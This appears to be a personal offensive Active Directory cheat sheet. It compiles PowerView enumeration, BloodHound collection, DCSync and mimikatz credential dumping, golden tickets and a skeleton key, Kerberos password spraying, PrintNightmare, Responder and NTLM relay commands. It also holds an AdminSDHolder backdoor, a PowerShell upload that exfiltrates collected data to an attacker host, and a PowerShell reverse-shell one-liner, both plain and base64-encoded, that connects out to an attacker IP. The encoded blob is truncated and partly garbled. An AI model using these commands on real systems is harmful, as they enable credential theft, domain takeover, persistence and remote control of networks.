# Get the logged on users for all machines in any *server* OU in a particular domain
Get-DomainOU -Identity *server* -Domain <domain> | %{Get-DomainComputer -SearchBase $_.distinguishedname -Properties dnshostname | %{Get-NetLoggedOn -ComputerName $_}}

# enumerate all gobal catalogs in the forest
Get-ForestGlobalCatalog

# turn a list of computer short names to FQDNs, using a global catalog
gc computers.txt | % {Get-DomainComputer -SearchBase "GC://GLOBAL.CATALOG" -LDAP "(name=$_)" -Properties dnshostname}

# enumerate the current domain controller policy
$DCPolicy = Get-DomainPolicy -Policy DC
$DCPolicy.PrivilegeRights # user privilege rights on the dc...

# enumerate the current domain policy
$DomainPolicy = Get-DomainPolicy -Policy Domain
$DomainPolicy.KerberosPolicy # useful for golden tickets ;)
$DomainPolicy.SystemAccess # password age/etc.

# enumerate what machines that a particular user/group identity has local admin rights to
#   Get-DomainGPOUserLocalGroupMapping == old Find-GPOLocation
Get-DomainGPOUserLocalGroupMapping -Identity <User/Group>

# enumerate what machines that a given user in the specified domain has RDP access rights to
Get-DomainGPOUserLocalGroupMapping -Identity <USER> -Domain <DOMAIN> -LocalGroup RDP

# export a csv of all GPO mappings
Get-DomainGPOUserLocalGroupMapping | %{$_.computers = $_.computers -join ", "; $_} | Export-CSV -NoTypeInformation gpo_map.csv

# use alternate credentials for searching for files on the domain
#   Find-InterestingDomainShareFile == old Invoke-FileFinder
$Password = "PASSWORD" | ConvertTo-SecureString -AsPlainText -Force
$Credential = New-Object System.Management.Automation.PSCredential("DOMAIN\user",$Password)
Find-InterestingDomainShareFile -Domain DOMAIN -Credential $Credential

# enumerate who has rights to the 'matt' user in 'testlab.local', resolving rights GUIDs to names
Get-DomainObjectAcl -Identity matt -ResolveGUIDs -Domain testlab.local

# grant user 'will' the rights to change 'matt's password
Add-DomainObjectAcl -TargetIdentity matt -PrincipalIdentity will -Rights ResetPassword -Verbose

# audit the permissions of AdminSDHolder, resolving GUIDs
Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -ResolveGUIDs

# backdoor the ACLs of all privileged accounts with the 'matt' account through AdminSDHolder abuse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All

# retrieve *most* users who can perform DC replication for dev.testlab.local (i.e. DCsync)
Get-DomainObjectAcl "dc=dev,dc=testlab,dc=local" -ResolveGUIDs | ? {
    ($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')
}

# find linked DA accounts using name correlation
Get-DomainGroupMember 'Domain Admins' | %{Get-DomainUser $_.membername -LDAPFilter '(displayname=*)'} | %{$a=$_.displayname.split(' ')[0..1] -join ' '; Get-DomainUser -LDAPFilter "(displayname=*$a*)" -Properties displayname,samaccountname}

# save a PowerView object to disk for later usage
Get-DomainUser | Export-Clixml user.xml
$Users = Import-Clixml user.xml

# Find any machine accounts in privileged groups
Get-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse | ?{$_.MemberName -like '*$'}

# Enumerate permissions for GPOs where users with RIDs of > -1000 have some kind of modification/control rights
Get-DomainObjectAcl -LDAPFilter '(objectCategory=groupPolicyContainer)' | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner')}

# find all policies applied to a current machine
Get-DomainGPO -ComputerIdentity windows1.testlab.local

# enumerate all groups in a domain that don't have a global scope, returning just group names
Get-DomainGroup -GroupScope NotGlobal -Properties name

# enumerate all foreign users in the global catalog, and query the specified domain localgroups for their memberships
#   query the global catalog for foreign security principals with domain-based SIDs, and extract out all distinguishednames
$ForeignUsers = Get-DomainObject -Properties objectsid,distinguishedname -SearchBase "GC://testlab.local" -LDAPFilter '(objectclass=foreignSecurityPrincipal)' | ? {$_.objectsid -match '^S-1-5-.*-[1-9]\d{2,}$'} | Select-Object -ExpandProperty distinguishedname
$Domains = @{}
$ForeignMemberships = ForEach($ForeignUser in $ForeignUsers) {
    # extract the domain the foreign user was added to
    $ForeignUserDomain = $ForeignUser.SubString($ForeignUser.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
    # check if we've already enumerated this domain
    if (-not $Domains[$ForeignUserDomain]) {
        $Domains[$ForeignUserDomain] = $True
        # enumerate all domain local groups from the given domain that have membership set with our foreignSecurityPrincipal set
        $Filter = "(|(member=" + $($ForeignUsers -join ")(member=") + "))"
        Get-DomainGroup -Domain $ForeignUserDomain -Scope DomainLocal -LDAPFilter $Filter -Properties distinguishedname,member
    }
}
$ForeignMemberships | fl

# if running in -sta mode, impersonate another credential a la "runas /netonly"
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Invoke-UserImpersonation -Credential $Cred
# ... action
Invoke-RevertToSelf

# enumerates computers in the current domain with 'outlier' properties, i.e. properties not set from the firest result returned by Get-DomainComputer
Get-DomainComputer -FindOne | Find-DomainObjectPropertyOutlier

# set the specified property for the given user identity
Set-DomainObject testuser -Set @{'mstsinitialprogram'='\\EVIL\program.exe'} -Verbose

# Set the owner of 'dfm' in the current domain to 'harmj0y'
Set-DomainObjectOwner -Identity dfm -OwnerIdentity harmj0y

# retrieve *most* users who can perform DC replication for dev.testlab.local (i.e. DCsync)
Get-ObjectACL "DC=testlab,DC=local" -ResolveGUIDs | ? {
    ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ObjectAceType -match 'Replication-Get')
}

# check if any user passwords are set
$FormatEnumerationLimit=-1;Get-DomainUser -LDAPFilter '(userPassword=*)' -Properties samaccountname,memberof,userPassword | % {Add-Member -InputObject $_ NoteProperty 'Password' "$([System.Text.Encoding]::ASCII.GetString($_.userPassword))" -PassThru} | fl
```

## Bloodhound / Neo4j
```
sudo neo4j start
sudo bloodhound 

PS C:\Users\wint3rmute> . .\SharpHound.ps1 <- You can optionally import the module with dot sourcing
Import-Module .\SharpHound.ps1

Now you can execute Invoke-BloodHound by providing All to -CollectionMethod to invoke all available collection methods.
PS C:\Users\wint3rmute> Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Windows\Temp

Exfiltrate the generated .zip file archive to your Kali machine then start neo4j and BloodHound. 
Once BloodHound is started, we'll upload the zip archive with the Upload Data function.
Once the upload is finished, we can start the enumeration of the AD environment with BloodHound.

Powershell File Upload (quick exfil I like, must have upload.php set)
start apache
sudo systemctl start apache2
powershell (New-Object System.Net.WebClient).UploadFile('http://192.168.119.x/upload.php', 'bloodhound.zip')

Bloodhound
BloodHound is used to create a mapping of Active directory environment which allows us as an attacker to better understand the posture of target infrastructure. 
It maps trusts,permissions , groups users and make our further pentesting more deep.

We will be using a powershell script used to receive information from target known as SharpHound which is part of Bloodhound project
    First run neo4j console on our machine
    neo4j console credentials neo4j:neo4j

go to localhost address and first click run button then add the above credentials which are default
I changed on my machine neo4j : hello

    Now on target we First bypasss powershell execution policy
    powershell -ep bypass
    Run SharpHound.ps1
    . .\SharpHound.ps1

    Now after importing the module in powershell session we will retreive all the info
    Invoke-Bloodhound -CollectionMethod All -Domain domain.name -ZipFileName info.zip

    Transfer the file back to our machine
    Now type bloodhound on our machine

    Give same credentials as neo4j neo4j : hello
    NOw upload the zip file on bloodhound console
    Now simply click analysis and click any type of query and we can see graph of AD
    We can view varius types of permissions etc
```

## Bloodhound Cypher Queries
```
Return all users:
MATCH (u:User) RETURN u 

Return all computers:
MATCH (c:Computer) RETURN c

Return the users with the name containing "ADMIN":
MATCH (u:User) WHERE u.name =~ ".ADMIN." RETURN u.name

Return all the users and the computer they are admin to:
MATCH p = (u:User)-[:AdminTo]->(c:Computer) RETURN p

Return the users with the name containing "ADMIN" and the computer they are admin to:
MATCH p = (u:User)-[:AdminTo]->(c:Computer) WHERE u.name =~ ".ADMIN." RETURN p 
MATCH p=shortestPath((c {owned: true})-[*1..3]->(s)) WHERE NOT c = s RETURN p 
MATCH p=shortestPath((u {highvalue: false})-[1..]->(g:Group {name: 'DOMAIN ADMINS@RASTALABS.LOCAL'})) WHERE NOT (u)-[:MemberOf1..]->(:Group {highvalue: true}) RETURN p

List all owned users:
MATCH (m:User) WHERE m.owned=TRUE RETURN m

List all owned computers:
MATCH (m:Computer) WHERE m.owned=TRUE RETURN m

List all owned groups:
MATCH (m.Group) WHERE m.owned=TRUE RETURN m

List all high value targets:
MATCH (m) WHERE m.highvalue=TRUE RETURN M

List the groups of all owned users:
MATCH (m.User) WHERE m.owned=TRUE WITH m MATCH p=(m) - [:MemberOf*1..] - > (n:Group) RETURN p

Find all Kerberostable Users:
MATCH (n:User) WHERE n.hasspn=true RETURN n

Find all users with an SPN/find all kerberostable users with passwords last set less than 5 years ago:
MATCH (u:User) WHERE u.hasspn=true AND u.pwdlastset < (datetime().epochseconds - (1825 * 86400)) AND NOT u.pwdlastset IN [-1.0, 0.0] RETURN u.name, u.pwdlastset order by u.pwdlastset

Find kerberostable users with a path to DA:
MATCH (u:User {hasspn:true}) MATCH (g:Group) WHERE g.objectid ENDS WITH '-512' MATCH p=shortestPath( (u)-[*1..]->(g) ) RETURN p

Find machines Domain Users can RDP into:
match p(g:Group)-[:CanRDP]->(c:Computer) where g.objectid ENDS WITH '-513' return p
```

## DCSync
```
lsadump::dcsync /user:krbtgt
lsadump::dcsync /user:domain\krbtgt /domain:lab.local

DC SYNC
PS C:\Tools> .\mimikatz.exe
mimikatz # lsadump::dcsync /user:corp\dave    
Mimikatz performed the dcsync attack by impersonating a domain controller and obtained the user credentials of dave by using replication

kali@kali:~$ hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

we can perform the dcsync attack to obtain any user password hash in the domain, even the domain administrator Administrator.
mimikatz # lsadump::dcsync /user:corp\Administrator

Linux DCSYNC hash attack 
kali@kali:~$ impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"Password123"@192.168.50.x
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
mute:1103:aad3b435b51404eeaad3b435b51404ee:08d7a47a6f9f66b97b1bae4178747494:::

We need a user that is a member of Domain Admins, Enterprise Admins, or Administrators,
The dcsync attack is a powerful technique to obtain any domain user credentials. As a bonus, we can use it from both Windows and Linux. 
By impersonating a domain controller, we can use replication to obtain user credentials from a domain controller. 
However, to perform this attack, we need a user that is a member of Domain Admins, Enterprise Admins, or Administrators, because there are certain rights required to start the replication. 
Alternatively, we can leverage a user with these rights assigned, though we're far less likely to encounter one of these in a real penetration test.
```

## Kerbrute 
```Enumerating AD users for kerberos attack (requires dc ip and wordlist)
using tool called kerbrute

To enumerate avalible users for kerberos authentication use command
here dc is for domain controller and d is for domain. d is necessary to specify
    ./kerbrute userenum --dc IPdomaincontroller -d CONTROLLER.local WordLists/ADusers.txt

If we have credentials of the machine then we can enumerate users more accurately with impacket
    GetADUSers.py -all domain.name/USER:PASS@computername -dc-ip IPADDRESS


User Enumeration
./kerbrute userenum -d <DOMAIN> --dc <DOMAIN> /PATH/TO/FILE/<USERNAMES>

Password Spray
./kerbrute passwordspray -d <DOMAIN> --dc <DOMAIN> /PATH/TO/FILE/<USERNAMES> <PASSWORD>


python kerbrute.py -users /home/kali/users.txt -domain domain.local -dc-ip 192.168.224.x
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Valid user => mute
[*] Valid user => administrator
[*] Blocked/Disabled user => krbtgt
[*] Valid user => svc_apache$
[*] No passwords were discovered :'(
```

## Lateral Movement
```
Gain access in other machines
We can use smbexec,wmiexec,psexec using the gained credentials for a semi interactive shell.
Then we can find a way to gain a interactive shell or pipe a C2 Framework like empire for persistence or post exploitation.psexec is noisy and should be as a last resort

NOTE: We can also use hashes instead of password

    smbexec.py domain/username@IPADDRESS
    OR smbexec.py domain/username@IPADDRESS -hashes FullHash (same syntax for below)

    wmiexec.py domain/username@IPADDRESS

    psexec.py domain/username@IPADDRESS
```

## ldapdomaindump
```
Domain Info dump (Authenticated)
we can get Entire users,froups,trusts info dumped if we have credentials for a domain user (does not need to be of higher privilege)
    ldapdomaindump $ip -u 'domain.name\username' -p password
```

## Ldap Enumeration
```
Ldap nmap scripts:
Enumeration with nmap scripts
nmap -p 389 --script ldap-search 10.10.10.x
nmap -n -sV --script "ldap*" -p 389 10.10.10.x
nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='MEGACORP.CORP',userdb=/usr/share/wordlists/seclists/Usernames/Names/names.txt 10.10.13.x

LDAP Enumeration
ldapsearch -x -h 10.10.10.x -p 389 -s base namingcontexts
ldapsearch -h 10.10.10.x -p 389 -x -b "dc=boxname,dc=local"

find service accounts
ldapsearch -h 10.10.10.x -p 389 -x -b "dc=box,dc=local" | grep "service"

Enumeration with ldapsearch as authenticated user
ldapsearch -x -h ldap.megacorp.corp -w '$pass'
ldapsearch -x -h 10.10.131.x -p 389 -b "dc=megacorp,dc=corp" -D 'rio@megacorp.corp' -w 'vs2k6!'
ldapsearch -D "cn=binduser,ou=users,dc=megacorp,dc=corp" -w 'J~42%W?]g' -s base namingcontexts
ldapsearch -D "cn=binduser,ou=users,dc=megacorp,dc=corp" -w 'J~42%W?]g' -b 'dc=megacorp'

Enumeration with ldapdomaindump (authenticated) with nice output
ldapdomaindump 10.10.197.x -u 'megacorp.corp\john' -p '$pass' --no-json --no-grep

Nmap
Enumeration with nmap scripts
nmap -p 389 --script ldap-search 10.10.10.x
nmap -n -sV --script "ldap*" -p 389 10.10.10.x
nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='MEGACORP.CORP',userdb=/usr/share/wordlists/seclists/Usernames/Names/names.txt 10.10.13.x

LDAP
Tools:
ldapsearch

ldapsearch -h <ip> -p 389 -x -s base

Anonymous Bind:
ldapsearch -h ldaphostname -p 389 -x -b "dc=domain,dc=com"

Authenticated:
ldapsearch -h 192.168.0.60 -p 389 -x -D "CN=Administrator, CN=User, DC=<domain>, DC=com" -b "DC=<domain>, DC=com" -W



ldapsearch
ldapsearch -x -h 10.10.10.x -s base namingcontexts

ldapsearch -x -b <search_base> -H <ldap_host>
ldapsearch -x -b "dc=devconnected,dc=com" -H ldap://192.168.x.x
ldapsearch -x -H ldap://192.168.x.x -b “dc=devconnected,dc=com”


Search LDAP with admin account
To search LDAP using the admin account, you have to execute the “ldapsearch” query with the “-D” option for the bind DN and the “-W” in order to be prompted for the password.
$ ldapsearch -x -b <search_base> -H <ldap_host> -D <bind_dn> -W

As an example, let’s say that your administrator account has the following distinguished name : “cn=admin,dc=devconnected,dc=com“.
In order to perform a LDAP search as this account, you would have to run the following query
$ ldapsearch -x -b "dc=devconnected,dc=com" -H ldap://192.168.178.x -D "cn=admin,dc=devconnected,dc=com" -W 

Finding all objects in the directory tree
In order to return all objects available in your LDAP tree, you can append the “objectclass” filter and a wildcard character “*” to specify that you want to return all objects.
$ ldapsearch -x -b <search_base> -H <ldap_host> -D <bind_dn> -W "objectclass=*"

Finding user accounts using ldapsearch
For example, let’s say that you want to find all user accounts on the LDAP directory tree.

By default, user accounts will most likely have the “account” structural object class, which can be used to narrow down all user accounts.
$ ldapsearch -x -b <search_base> -H <ldap_host> -D <bind_dn> -W "objectclass=account"

By default, the query will return all attributes available for the given object class.
$ ldapsearch -x -b “dc=devconnected,dc=com” -H ldap://192.168.x.x -D “cn=admin,dc=devconnected,dc=com” -W “objectclass=account)”

For example, if you are interested only in the user CN, UID, and home directory, you would run the following LDAP search
$ ldapsearch -x -b <search_base> -H <ldap_host> -D <bind_dn> -W "objectclass=account" cn uid homeDirectory
ldapsearch -x -b “dc=devconnected,dc=com” -H ldap://192.168.x.x -D “cn=admin,dc=devconnected,dc=com” -W “objectclass=account)” cn uid homeDirectory
```

## LDAP Search Reference Guide
```
# Basic Search (Anonymous)
ldapsearch -x -h <hostname> -p <port> -b "dc=example,dc=com" "(objectclass=*)"

# Search with credentials
ldapsearch -x -D "cn=admin,dc=example,dc=com" -w <password> -h <hostname> -p <port> -b "dc=example,dc=com" "(objectclass=*)"

# Search with SSL/TLS
ldapsearch -Z -D "cn=admin,dc=example,dc=com" -w <password> -h <hostname> -p <port> -b "dc=example,dc=com" "(objectclass=*)"

# Filter results by attribute (e.g., cn)
ldapsearch -x -h <hostname> -p <port> -b "dc=example,dc=com" "(cn=username)"

# Filter results by multiple attributes (e.g., cn and mail)
ldapsearch -x -h <hostname> -p <port> -b "dc=example,dc=com" "(&(cn=username)(mail=email@example.com))"

# Return specific attributes
ldapsearch -x -h <hostname> -p <port> -b "dc=example,dc=com" "(objectclass=*)" cn mail

# Search in subtree
ldapsearch -x -h <hostname> -p <port> -b "dc=example,dc=com" -s sub "(objectclass=*)"

# Search in one level
ldapsearch -x -h <hostname> -p <port> -b "dc=example,dc=com" -s one "(objectclass=*)"

# Search in base object only
ldapsearch -x -h <hostname> -p <port> -b "dc=example,dc=com" -s base "(objectclass=*)"

# Search with size and time limits
ldapsearch -x -h <hostname> -p <port> -b "dc=example,dc=com" -l <time_limit> -z <size_limit> "(objectclass=*)"

# Paging results
ldapsearch -x -h <hostname> -p <port> -b "dc=example,dc=com" -E "pr=<page_size>/noprompt" "(objectclass=*)"

# Extended options with -o
ldapsearch -x -h <hostname> -p <port> -b "dc=example,dc=com" -o ldif-wrap=no "(objectclass=*)"
```

## Mimikatz
```
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords    

lsadump::dcsync /user:krbtgt
lsadump::dcsync /user:domain\krbtgt /domain:lab.local

#general
privilege::debug
log
log customlogfilename.log

#sekurlsa
sekurlsa::logonpasswords
sekurlsa::logonPasswords full
sekurlsa::tickets /export
sekurlsa::pth /user:Administrateur /domain:winxp /ntlm:f193d757b4d487ab7e5a3743f038f713 /run:cmd

#kerberos
kerberos::list /export
kerberos::ptt c:\chocolate.kirbi
kerberos::golden /admin:administrateur /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /ticket:chocolate.kirbi

#crypto
crypto::capi
crypto::cng
crypto::certificates /export
crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE
crypto::keys /export
crypto::keys /machine /export

#vault & lsadump
vault::cred
vault::list
token::elevate
vault::cred
vault::list
lsadump::sam
lsadump::secrets
lsadump::cache
token::revert
lsadump::dcsync /user:domain\krbtgt /domain:lab.local

#pth
sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:cc36cf7a8514893efccd332446158b1a
sekurlsa::pth /user:Administrateur /domain:chocolate.local /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9
sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:cc36cf7a8514893efccd332446158b1a /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9
sekurlsa::pth /user:Administrator /domain:WOSHUB /ntlm:{NTLM_hash} /run:cmd.exe

#ekeys
sekurlsa::ekeys

#dpapi
sekurlsa::dpapi

#minidump
sekurlsa::minidump lsass.dmp

#ptt
kerberos::ptt Administrateur@krbtgt-CHOCOLATE.LOCAL.kirbi

#golden/silver
kerberos::golden /user:utilisateur /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /id:1107 /groups:513 /ticket:utilisateur.chocolate.kirbi
kerberos::golden /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /aes256:15540cac73e94028231ef86631bc47bd5c827847ade468d6f6f739eb00c68e42 /user:Administrateur /id:500 /groups:513,512,520,518,519 /ptt /startoffset:-10 /endin:600 /renewmax:10080
kerberos::golden /admin:Administrator /domain:CTU.DOMAIN /sid:S-1-1-12-123456789-1234567890-123456789 /krbtgt:deadbeefboobbabe003133700009999 /ticket:Administrator.kiribi

#tgt
kerberos::tgt

#purge
kerberos::purge

Start an RPC Server:
rpc::server

Connect to RPC server:
rpc::connect

Stop RPC Connection:
rpc::server /stop

Enumerate all the RPC things:
rpc::enum

Securely Connect to RPC Server:
rpc::connect /server:192.168.1.66 /alg:RC4

Interact with remote RPC Server:
***Always prepend commands with an asterisk to interact remotely

local mimikatz command - sekurlsa::logonpasswords
remote mimikatz command - *sekurlsa::logonpasswords

Show who you are: 
token::whoami

Show other tokens:
token::list /user:administrator
token::list /user:domainadmin
token::list /user:enterpriseadmin
token::list /user:system\
token::list /user:bob123

Run process with a token:
token::run /process:cmd.exe

Get those privileges:
token::elevate

Revert Token:
token::revert

Allow Multiple RDP sessions
ts::multirdp

List all current sessions
ts::sessions

Takeover specified session
ts::remote /id:1


Pass RDP session into other sessions ID
ts::remote /id:1 /target:2

Use password of user who owns sessions
ts::remote /id:1 /password:F@ll2019!

Meterpreter
meterpreter > getprivs
meterpreter > creds_all
meterpreter > golden_ticket_create

Pass the Ticket
.\mimikatz.exe
mimikatz # sekurlsa::tickets /export
mimikatz # kerberos::ptt [0;76126]-2-0-40e10000-Administrator@krbtgt-<RHOST>.LOCAL.kirbi
klist
dir \\<RHOST>\admin$

Forge Golden Ticket
C:\> .\mimikatz.exe
mimikatz # privilege::debug
mimikatz # lsadump::lsa /inject /name:krbtgt
mimikatz # kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:500
mimikatz # misc::cmd
klist
dir \\<RHOST>\admin$

Skeleton Key
mimikatz # privilege::debug
mimikatz # misc::skeleton
net use C:\\<RHOST>\admin$ /user:Administrator mimikatz
dir \\<RHOST>\c$ /user:<USERNAME> mimikatz
```

## PrintNightmare CVE-2021-1675
```
https://github.com/cube0x0/CVE-2021-1675
This cve works because of the spooler service running in windows and currently it is not patched and only mitigation is to disable spooler service so we need this service running in order to exploit

First we see if spooler service is running or not

    Run following command in attacker machine and see if we get similiar results as shown

rpcdump.py @TargetIp| egrep 'MS-RPRN|MS-PAR'

Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol Protocol: [MS-RPRN]: Print System Remote Protocol

    Now we need a malicuius dll containing our code and a smb server running to host it

    we create a dll from msffvenom or any other way and run impacket smb server to host it

    Now we simply run the exploit remotely as shown in the github

    ./CVE-2021-1675.py domain.name/domain_user:passsword@TargetIP '\OurIPAddress\smb\file.dll'
```

## Responder
```
Capture forced authentication credentials.
sudo  responder -I tun0 -wv  

Snap the web_svc user's credentials forcing them to authenticate to our impacket-smbserver/Responder smb server. 
UNC Path from portal \\192.168.x.x\smbshare 
\\192.168.x.x\smbshare
C:\Windows\system32>dir \\192.168.x.x\smbshare

Crack the hash.
hashcat -m 5600 mute.hash /usr/share/wordlists/rockyou.txt 


Getting an NetNTLMv2 Hash from MS-SQL (port 1433)
After finding that we have access to mssql, we can use a great tool called mssqlclient.py from the Impacket Collection of Tools to connect to the server with the following command:
mssqlclient.py -p 1433 reporting@10.10.10.125 -windows-auth

We get prompted for the password and successfully gain an ‘SQL’ shell.
The first thing we want is enumerate the database and then try to enable the xp_cmdshell; however, if we are denied access to do so, we can try running Responder to grab a hash of the user who owns the MSSQL service.

Fire up Responder with the following command:
responder -I tun0

With Responder running, we can now dump the MSSQL service owners hash using the exec master..exp_dirtree command, like so:
exec master..xp_dirtree '\\10.10.14.2\test'

This will attempt to connect to a share named ‘test’ on our attacker machine’s IP. When the user attempts to connect, they will present the NetNTLMv2 hash of the service owner to request to connect to our share. Responder will intercept this request and dump the NetNTLMv2 hash.

Crack the NetNTLMv2
hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force

NetNTLMv2 Relay
Relaying Net-NTLMv2

Imagine we obtained the Net-NTLMv2 hash, but couldn't crack it because it was too complex.

In this attack, we'll again use the dir command in the bind shell to create an SMB connection to our Kali machine. 
Instead of merely printing the Net-NTLMv2 hash used in the authentication step, we'll forward it to FILES02. 
If files02admin is a local user of FILES02, the authentication is valid and therefore accepted by the machine. 
If the relayed authentication is from a user with local administrator privileges, we can use it to authenticate and then execute commands over SMB with methods similar to those used by psexec or wmiexec.

If UAC remote restrictions are enabled on the target then we can only use the local Administrator user for the relay attack.

ntlmrelayx
We'll perform this attack with ntlmrelayx, another tool from the impacket library. 
This tool does the heavy lifting for us by setting up an SMB server and relaying the authentication part of an incoming SMB connection to a target of our choice.

Let's get right into the attack by starting ntlmrelayx, which we can use with the pre-installed impacket-ntlmrelayx package. 
We'll use --no-http-server to disable the HTTP server since we are relaying an SMB connection and -smb2support to add support for SMB2. 
We'll also use -t to set the target to FILES02. 
Finally, we'll set our command with -c, which will be executed on the target system as the relayed user. 

We'll use a PowerShell reverse shell one-liner,  which we'll base64-encode and execute with the -enc argument 

kali@kali:~$ sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.x -c "powershell -enc JABjAGwAaQBlAG4AdA..." 

└─$ sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.156.212 -c "powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEAMQA5AC4AMQA1ADYAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"

PS base64 encoded reverse shell one liner via PS
$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.x",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
PS> $EncodedText =[Convert]::ToBase64String($Bytes)
PS> $EncodedText

JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEAMQA5AC4AMQA1ADYAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkA